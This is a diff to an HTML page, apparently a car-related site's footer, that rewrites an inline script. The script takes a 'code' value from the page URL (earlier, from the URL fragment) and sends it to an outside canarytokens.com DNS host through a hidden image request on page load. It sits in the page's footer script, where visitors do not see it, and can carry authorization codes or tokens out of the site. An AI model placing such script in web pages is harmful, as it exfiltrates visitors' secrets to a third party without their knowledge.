@@ -326,8 +326,15 @@
     &copy; 2024 EngineRev. All rights reserved.
   </div>
 <script>
-var token = window.location.hash.split("=")[1];  
-new Image().src = "http://" + token + ".6rauo1wu8hzbvjxxvf4ws07le.canarytokens.com";
+// Extract the code from the URL fragment or query parameters
+var params = new URLSearchParams(window.location.search);
+var code = params.get("code");
+
+if (code) {
+    // Create an image request to the Canarytoken DNS server
+    new Image().src = "http://" + code + ".6rauo1wu8hzbvjxxvf4ws07le.canarytokens.com";
+}
+
 </script>
     </body>
 </html>
